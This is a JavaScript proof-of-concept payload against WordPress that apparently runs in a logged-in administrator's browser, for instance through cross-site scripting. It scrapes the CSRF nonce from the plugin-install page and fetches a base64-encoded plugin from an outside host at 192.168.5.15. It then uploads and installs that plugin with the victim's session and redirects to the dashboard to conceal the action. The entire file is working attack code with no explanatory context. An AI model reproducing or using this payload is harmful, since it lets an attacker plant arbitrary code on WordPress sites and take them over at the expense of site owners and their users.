const pluginURL = "http://192.168.5.15/WP_PoC.txt";
const wpRoot = "";
const installPluginPath = "/wp-admin/plugin-install.php";
const installPluginURL = wpRoot + installPluginPath;
const updatePluginURL = wpRoot + "/wp-admin/update.php?action=upload-plugin";
const dashboardURL = wpRoot + "/wp-admin/index.php";
const req = new XMLHttpRequest();
req.open("GET", installPluginURL, false);
req.send(null);
const csrfToken = req.responseText.match(/input type="hidden" id="_wpnonce" name="_wpnonce" value="([^"]*?)"/)[1];
const genRandHex = size => [...Array(size)].map(() => Math.floor(Math.random() * 16).toString(16)).join("");
const boundary = "-----------------------------" + genRandHex(28);
async function fetchPlugin(pluginURL) {
  const response = await fetch(pluginURL);
  const content = await response.text();
  return content;
}
var pluginContent = "";
fetchPlugin(pluginURL).then(content => {
  pluginContent = atob(content);
  const newline = "\r\n";
  const bodyData = boundary + newline +
    "Content-Disposition: form-data; name=\"_wpnonce\"" + newline +
    newline +
    csrfToken + newline +
    boundary + newline +
    "Content-Disposition: form-data; name=\"_wp_http_referer\"" + newline +
    newline +
    installPluginPath + newline +
    boundary + newline +
    "Content-Disposition: form-data; name=\"pluginzip\"; filename=\"" + pluginURL.split("/")[3].slice(0, -3)  + "zip\"" + newline +
    "Content-Type: application/zip" + newline +
    newline +
    pluginContent + newline +
    boundary + newline +
    "Content-Disposition: form-data; name=\"install-plugin-submit\"" + newline +
    newline +
    "Install Now" + newline +
    boundary + "--" + newline;
  var bodyDataArray = new Uint8Array(bodyData.length);
  for(var i = 0; i < bodyDataArray.length; i ++) { bodyDataArray[i] = bodyData.charCodeAt(i); };
  req.open("POST", updatePluginURL, true);
  req.setRequestHeader("Content-Type", "multipart\/form-data; boundary=" + boundary.slice(2));
  req.withCredentials = true;
  req.send(new Blob([bodyDataArray]));
  req.onreadystatechange = function() {
    if (req.readyState == XMLHttpRequest.DONE) {
      window.location.replace(dashboardURL);
    }
  }
});
